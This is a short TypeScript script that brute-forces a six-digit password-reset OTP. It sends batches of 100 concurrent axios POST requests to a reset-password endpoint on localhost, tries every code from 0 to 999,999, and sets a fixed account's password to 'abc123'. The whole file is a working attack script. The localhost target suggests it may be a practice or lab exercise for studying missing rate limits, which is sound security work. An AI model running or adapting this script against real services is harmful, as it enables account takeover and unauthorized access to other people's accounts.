import axios from "axios";

async function sendRequest(bruteOTP: string) {
  let data = JSON.stringify({
    email: "ardo@gmail.com",
    otp: bruteOTP,
    newPassword: "abc123",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };
  try {
    await axios.request(config);
  } catch (e) {}
}

async function bruteForceOTP() {
  for (let i = 0; i < 1000000; i += 100) {
    const p = [];
    for (let j = 0; j < 100; j++) {
      p.push(sendRequest((i + j).toString()));
    }
    console.log(i);
    await Promise.all(p);
  }
}

bruteForceOTP();
